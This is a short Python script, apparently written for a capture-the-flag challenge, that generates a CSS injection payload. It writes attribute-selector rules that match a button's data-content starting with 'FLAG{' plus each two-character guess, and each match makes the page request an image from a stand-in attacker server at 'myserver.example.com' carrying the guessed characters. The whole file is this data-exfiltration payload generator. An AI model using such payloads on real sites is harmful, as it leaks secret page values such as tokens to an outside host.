import string

url = "https://myserver.example.com"
c_flag = "FLAG{"

with open("example.css", mode="w") as f:
    for i in  string.ascii_letters + string.digits + "_-.$@!?":
        for j in  string.ascii_letters + string.digits + "_-.$@!?":
            f.write(f"button[data-content^='{c_flag}{i}{j}'] {{background-image: url('{url}/?{c_flag}{i}{j}');}}\n")